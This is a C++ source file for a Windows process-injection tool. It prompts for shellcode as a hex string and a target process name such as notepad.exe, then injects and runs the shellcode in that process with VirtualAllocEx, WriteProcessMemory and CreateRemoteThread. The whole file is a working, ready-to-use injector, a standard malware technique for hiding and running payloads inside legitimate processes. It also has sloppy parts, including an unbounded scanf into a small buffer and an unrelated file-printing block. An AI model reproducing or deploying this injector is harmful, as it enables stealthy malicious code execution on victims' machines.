// c++ headers
#include <iostream>
#include<iostream>
#include<fstream>

// c headers
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// Increase buffer size to handle large shellcode input strings safely
#define INPUT_SIZE 8000
#define ARR_SIZE 2000

using namespace std;


// find the process ID function
int FindPID(const char *procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
            
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }
            
    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
            
    CloseHandle(hProcSnap);
    return pid;
}

//inject shellcode payload into remote process
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (pRemoteCode == NULL) return -1;

    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
    
    hThread = CreateRemoteThread(hProc, NULL, 0,(LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

// Parses formats like "fc4881..." or "\xfc\x48..."
int ParseShellcode(const char* input, unsigned char* output, int max_size) {
    int len = 0;
    while (*input && len < max_size) {
        // Skip common formatting prefixes or formatting characters
        if (*input == '\\' || *input == 'x' || *input == ',' || *input == ' ' || *input == '\r' || *input == '\n') {
            input++;
            continue;
        }
        
        if (*input && *(input + 1)) {
            char byte_str[3] = { *input, *(input + 1), '\0' };
            output[len++] = (unsigned char)strtol(byte_str, NULL, 16);
            input += 2;
        } else {
            break;
        }
    }
    return len;
}


//main fuction
int main(void) {
	
	   // Open the text file
   ifstream file("input.txt");  
   // Check if the file was opened successfully
   if (!file) {
      cout<<"File cannot be opened!"<<endl;
      return 1;
   }
   string line;
   while (getline(file, line)) {
      // Print each line
      cout<<line<<endl;  
   }
   // Close the file
   file.close();  
	
	
    // Dynamic buffers to prevent stack overflow from large inputs
    char* input_buffer = (char*)malloc(INPUT_SIZE);
    unsigned char* payload = (unsigned char*)malloc(ARR_SIZE);

    if (input_buffer == NULL || payload == NULL) {
        printf("Memory allocation failed.\n");
        return -1;
    }

    // Prompt user for shellcode input via standard input stream
    printf("Enter the shellcode hex string (e.g., \\xfc\\x48... or fc48...):\n> ");
    if (fgets(input_buffer, INPUT_SIZE, stdin) == NULL) {
        printf("Error reading input.\n");
        free(input_buffer);
        free(payload);
        return -1;
    }

    // Parse the typed/pasted string into the byte array
    unsigned int payload_len = ParseShellcode(input_buffer, payload, ARR_SIZE);
    free(input_buffer); // Input string buffer no longer needed

    if (payload_len == 0) {
        printf("Failed to parse shellcode input.\n");
        free(payload);
        return -1;
    }

    printf("\nParsed %d bytes of payload successfully.\n\n", payload_len);


    //enter the process namd
    printf("Enter the process name you wish to inject (e.g., notepad.exe ):\n> ");
    
     char pname[50]; //char process name buffer
  
    // Read the process hame
    scanf("%s", pname); //input process name
    
    
    int pid = FindPID(pname); //enter process name into find Process function    
    HANDLE hProc = NULL;

    if (pid) { 
        printf("%s PID = %d\n", pname, pid); //output to console process namd and process ID

        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                            FALSE, (DWORD)pid);

		//output to console if payload was successfull or not
        if (hProc != NULL) {
            if (Inject(hProc, payload, payload_len) == 0) {
                printf("Injection completed successfully.\n");
            } else {
                printf("Injection failed.\n");
            }
            CloseHandle(hProc);
        } else {
            printf("Failed to open process. Error code: %lu\n", GetLastError());
        }
    } else {
        printf("Target process '%s' not found.\n", pname);
    }
    
    free(payload);
    
    
    system("pause");
    return 0;
}

